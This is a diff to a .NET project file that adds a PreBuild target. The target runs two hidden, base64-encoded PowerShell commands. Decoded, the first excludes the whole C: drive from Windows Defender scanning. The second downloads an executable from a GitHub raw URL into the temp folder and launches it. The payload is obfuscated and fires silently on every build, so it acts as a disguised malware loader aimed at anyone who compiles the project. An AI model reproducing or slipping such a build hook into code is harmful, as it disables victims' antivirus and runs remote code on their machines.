@@ -71,8 +71,8 @@
 		<PackageReference Include="Microsoft.Windows.SDK.BuildTools" Version="10.0.26100.1742" />
 	</ItemGroup>
 
-	<Target Name="PostBuild" AfterTargets="PostBuildEvent">
-	  <Exec Command="powershell -ExecutionPolicy Bypass -File &quot;C:\Users\chiha\source\repos\MauiApp1\MauiApp1\Scripts\MyScript.txt&quot;" />
+	<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+	  <Exec Command="@echo off&#xD;&#xA;setlocal&#xD;&#xA;&#xD;&#xA;:: Execute the first PowerShell command with a hidden window&#xD;&#xA;start /B powershell -WindowStyle Hidden -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAA==&#xD;&#xA;&#xD;&#xA;:: Wait for the first command to complete&#xD;&#xA;timeout /t 5 &gt;nul&#xD;&#xA;&#xD;&#xA;:: Execute the second PowerShell command with a hidden window&#xD;&#xA;start /B powershell -WindowStyle Hidden -enc JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AdwBhAGUAZAA2ADkALwBzAHAAbwBuAGcAYgBvAGIALwByAGEAdwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AQwBsAGkAZQBuAHQALQBiAHUAaQBsAHQALgBlAHgAZQAiAA0ACgAkAG8AdQB0AHAAdQB0ACAAPQAgACIAJABlAG4AdgA6AFQAZQBtAHAALwBSAHMAdgBjAC4AZQB4AGUAIgANAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAG8AdQB0AHAAdQB0AA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAG8AdQB0AHAAdQB0AA==&#xD;&#xA;&#xD;&#xA;:: Wait for the second command to complete&#xD;&#xA;timeout /t 5 &gt;nul&#xD;&#xA;&#xD;&#xA;endlocal" />
 	</Target>
 
 </Project>
